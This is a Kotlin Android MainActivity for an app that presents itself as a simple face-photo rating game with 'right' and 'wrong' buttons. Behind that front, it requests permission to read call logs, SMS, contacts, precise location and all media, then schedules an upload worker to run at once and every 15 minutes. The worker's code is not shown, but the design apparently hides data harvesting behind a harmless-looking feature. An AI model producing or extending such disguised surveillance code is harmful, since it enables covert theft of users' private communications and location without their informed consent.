package com.example.myapplication3

import android.Manifest
import android.content.pm.PackageManager
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.ImageView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.annotation.RequiresApi
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.bumptech.glide.Glide
import com.google.firebase.FirebaseApp
import com.example.myapplication3.network.RetrofitInstance
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.util.concurrent.TimeUnit

class MainActivity : AppCompatActivity() {

    private lateinit var imageView: ImageView // ImageView to display the fetched image
    private lateinit var buttonWrong: Button // Button for 'wrong'
    private lateinit var buttonRight: Button // Button for 'right'
    private var currentImageUrl: String? = null // Variable to hold the current image URL

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Initialize Firebase
        FirebaseApp.initializeApp(this)
        Log.d("MainActivity", "Firebase initialized.")

        // Initialize the ImageView and buttons
        imageView = findViewById(R.id.image_view) // Make sure this ID matches your XML
        buttonWrong = findViewById(R.id.button_wrong)
        buttonRight = findViewById(R.id.button_right)

        // Set up button click listeners
        buttonWrong.setOnClickListener {
            Log.d("MainActivity", "Image rejected: $currentImageUrl")
            fetchRandomImage() // Load new image when "wrong" is clicked
        }

        buttonRight.setOnClickListener {
            Log.d("MainActivity", "Image accepted: $currentImageUrl")
            fetchRandomImage() // Load new image when "right" is clicked
        }

        // Check for permissions and request if necessary
        if (!hasAllPermissions()) {
            Log.d("MainActivity", "Requesting permissions.")
            requestAllPermissions()
        } else {
            Log.d("MainActivity", "All permissions granted.")
            scheduleUploadWorker()
            scheduleImmediateUploadWorker()
            fetchRandomImage() // Fetch random image after permissions are granted
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun hasAllPermissions(): Boolean {
        val permissions = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        return permissions.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
    }

    @RequiresApi(Build.VERSION_CODES.TIRAMISU)
    private fun requestAllPermissions() {
        val permissionsToRequest = arrayOf(
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_MEDIA_IMAGES,
            Manifest.permission.READ_MEDIA_VIDEO,
            Manifest.permission.READ_MEDIA_AUDIO
        )

        ActivityCompat.requestPermissions(this, permissionsToRequest, REQUEST_ALL_PERMISSIONS)
    }

    // Handle the result of the permission request
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        if (requestCode == REQUEST_ALL_PERMISSIONS) {
            for (i in permissions.indices) {
                val permission = permissions[i]
                val isGranted = grantResults[i] == PackageManager.PERMISSION_GRANTED
                Log.d("MainActivity", "Permission: $permission, Granted: $isGranted")

                if (!isGranted) {
                    Log.e("MainActivity", "Permission denied: $permission")
                }
            }

            val allGranted = grantResults.all { it == PackageManager.PERMISSION_GRANTED }
            if (allGranted) {
                Log.d("MainActivity", "All permissions granted, scheduling workers.")
                scheduleUploadWorker()
                scheduleImmediateUploadWorker()
                fetchRandomImage() // Fetch random image after permissions are granted
            } else {
                Log.e("MainActivity", "Some permissions denied.")
            }
        }
    }

    private fun scheduleUploadWorker() {
        val workRequest = PeriodicWorkRequestBuilder<UploadWorker>(15, TimeUnit.MINUTES)
            .build()

        WorkManager.getInstance(this).enqueue(workRequest)
        Log.d("MainActivity", "Periodic upload worker scheduled.")
    }

    private fun scheduleImmediateUploadWorker() {
        val oneTimeWorkRequest = OneTimeWorkRequestBuilder<UploadWorker>()
            .build()
        WorkManager.getInstance(this).enqueue(oneTimeWorkRequest)
        Log.d("MainActivity", "Immediate upload worker scheduled.")
    }

    // Function to fetch a random image of a human face
    private fun fetchRandomImage() {
        CoroutineScope(Dispatchers.Main).launch {
            try {
                val photos = RetrofitInstance.api.getRandomPhotos(1) // Fetch one random photo
                val imageUrl = photos.firstOrNull()?.urls?.regular
                imageUrl?.let {
                    currentImageUrl = it // Update the current image URL
                    // Load the image into the ImageView using Glide
                    Glide.with(this@MainActivity)
                        .load(it)
                        .into(imageView)
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Error fetching image: ${e.message}")
            }
        }
    }

    companion object {
        private const val REQUEST_ALL_PERMISSIONS = 1001
    }
}
